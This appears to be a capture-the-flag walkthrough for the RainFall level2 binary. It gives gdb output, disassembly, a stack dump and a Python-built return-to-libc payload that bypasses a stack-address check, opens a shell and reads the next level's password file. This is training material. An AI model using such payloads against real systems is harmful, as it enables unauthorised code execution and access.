## Find SHELL env var

```sh
(gdb) x/s *((char **)environ)
0xbffff915:      "SHELL=/bin/bash"
(gdb) x/s *((char **)environ) + 6
0xbffff91b:      "/bin/bash"
```

We saw our offset to the return address was 80 so EBP is 80 - 4 (the size of EBP) = 76

## Return to libc

We will use the [return-to-libc method](https://css.csail.mit.edu/6.858/2019/readings/return-to-libc.pdf) so we are going to set the address of system in EBP, and his parameter after the return address area (the dedcated space for parameters)

```sh
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

```sh
level2@RainFall:~$ python -c "print('H' * 80 + '\x60\xb0\xe6\xb7' + 'A' * 4 + '\x1b\xf9\xff\xbf')" | ./level2
(0xb7e6b060)
```

```sh
(gdb) p exit
$1 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
```

```sh
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   %ebp
   0x080484d5 <+1>:	mov    %esp,%ebp
   0x080484d7 <+3>:	sub    $0x68,%esp
=> 0x080484da <+6>:	mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    $0x8048620,%eax
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
---Type <return> to continue, or q <return> to quit---
   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:	mov    %eax,(%esp)
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:	mov    %eax,(%esp)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret
   ```
   > ret = 0x0804853e


```sh
(gdb) x/80x $esp
0xbffff6c0:     0xbffff6dc      0x00000000      0x00000000      0xb7e5ec73
0xbffff6d0:     0x080482b5      0x00000000      0x00ca0000      0x48484848
0xbffff6e0:     0x48484848      0x48484848      0x48484848      0x48484848
0xbffff6f0:     0x48484848      0x48484848      0x48484848      0x48484848
0xbffff700:     0x48484848      0x48484848      0x48484848      0x48484848
0xbffff710:     0x48484848      0x48484848      0x48484848      0x48484848
0xbffff720:     0x48484848      0x48484848      0x48484848     [0x0804853e]
0xbffff730:    [0xb7e6b060]    [0xb7e5ebe0]    [0xbffff91b]     0xb7e45400
0xbffff740:     0x00000001      0xbffff7d4      0xbffff7dc      0xb7fdc858
0xbffff750:     0x00000000      0xbffff71c      0xbffff7dc      0x00000000
0xbffff760:     0x08048260      0xb7fd0ff4      0x00000000      0x00000000
0xbffff770:     0x00000000      0xd68f971b      0xe1c8330b      0x00000000
0xbffff780:     0x00000000      0x00000000      0x00000001      0x08048420
0xbffff790:     0x00000000      0xb7ff26b0      0xb7e453e9      0xb7ffeff4
0xbffff7a0:     0x00000001      0x08048420      0x00000000      0x08048441
0xbffff7b0:     0x0804853f      0x00000001      0xbffff7d4      0x08048550
0xbffff7c0:     0x080485c0      0xb7fed280      0xbffff7cc      0xb7fff918
0xbffff7d0:     0x00000001      0xbffff8fc      0x00000000      0xbffff915
0xbffff7e0:     0xbffff925      0xbffff939      0xbffff958      0xbffff96b
0xbffff7f0:     0xbffff977      0xbffffe98      0xbffffea4      0xbffffef1
```

```sh
level2@RainFall:~$ (python -c "print('H' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7'  + '\xe0\xeb\xe5\xb7' + '\x1b\xf9\xff\xbf')"; cat) | ./level2 
HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH>HHHHHHHHHHHH>`�������
cat /home/user/level3
level2@RainFall:~$ 
```

offset = 'H' * 80
ret = '\x3e\x85\x04\x08'
system = '\x60\xb0\xe6\xb7'
exit = '\xe0\xeb\xe5\xb7'
"/bin/bash" = '\x1b\xf9\xff\xbf'